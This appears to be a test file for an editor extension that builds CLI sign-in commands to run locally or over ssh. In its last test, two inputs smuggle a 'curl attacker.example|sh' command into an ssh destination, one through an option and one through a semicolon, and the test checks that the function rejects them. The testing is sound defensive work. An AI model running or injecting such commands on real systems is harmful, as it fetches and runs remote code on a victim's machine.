/*---------------------------------------------------------------------------------------------
 *  wisp: not part of Code - OSS. Edit editor/overlay in the wisp repo, not this copy.
 *--------------------------------------------------------------------------------------------*/

import assert from 'assert';
import { ensureNoDisposablesAreLeakedInTestSuite } from '../../../../base/test/common/utils.js';
import { buildSignInLaunch } from '../../common/wispSignIn.js';

suite('wispSignIn', () => {

	ensureNoDisposablesAreLeakedInTestSuite();

	test('runs the login command directly on local, and an empty host counts as local', () => {
		assert.deepStrictEqual(buildSignInLaunch('claude', 'local'), { kind: 'ok', launch: { executable: 'claude', args: ['auth', 'login'] } });
		assert.deepStrictEqual(buildSignInLaunch('codex', ''), { kind: 'ok', launch: { executable: 'codex', args: ['login'] } });
		assert.deepStrictEqual(buildSignInLaunch('cursor', 'local'), { kind: 'ok', launch: { executable: 'agent', args: ['login'] } });
	});

	test('runs ssh -t -- <trimmed destination> with remote-only login flags as separate argv entries', () => {
		const ssh = (host: string, cli: 'claude' | 'codex' | 'cursor') => {
			const result = buildSignInLaunch(cli, host);
			assert.strictEqual(result.kind, 'ok');
			assert.strictEqual(result.launch.executable, 'ssh');
			return result.launch.args;
		};
		assert.deepStrictEqual(ssh('  mac-mini  ', 'claude'), ['-t', '--', 'mac-mini', 'claude', 'auth', 'login']);
		assert.deepStrictEqual(ssh('mac-mini', 'codex'), ['-t', '--', 'mac-mini', 'codex', 'login', '--device-auth']);
		// An env argv prefix, not a shell assignment.
		assert.deepStrictEqual(ssh('mac-mini', 'cursor'), ['-t', '--', 'mac-mini', 'env', 'NO_OPEN_BROWSER=1', 'agent', 'login']);
	});

	test('never builds ssh argv for an invalid destination', () => {
		const result = buildSignInLaunch('claude', '-oProxyCommand=curl attacker.example|sh');
		assert.strictEqual(result.kind, 'error');
		assert.match(result.message, /option/);
		assert.strictEqual(buildSignInLaunch('claude', 'mac-mini;curl attacker.example|sh').kind, 'error');
	});
});
